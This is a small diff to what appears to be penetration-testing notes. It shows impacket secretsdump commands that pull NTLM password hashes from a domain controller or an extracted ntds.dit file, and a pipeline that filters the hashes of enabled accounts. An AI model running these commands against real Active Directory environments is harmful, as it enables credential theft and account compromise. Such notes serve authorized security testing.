@@ -64,4 +64,5 @@ impacket-secretsdump -just-dc-ntlm FQDN/DA-account@DC-IP
 
 ***New commands*** (python3.9)
 /usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash -user-status -outputfile <filename> local
-cat hashes | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -d"(" -f1 < for getting just the hashes
+
+cat hashes | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -d"(" -f1 # < for getting just the hashes
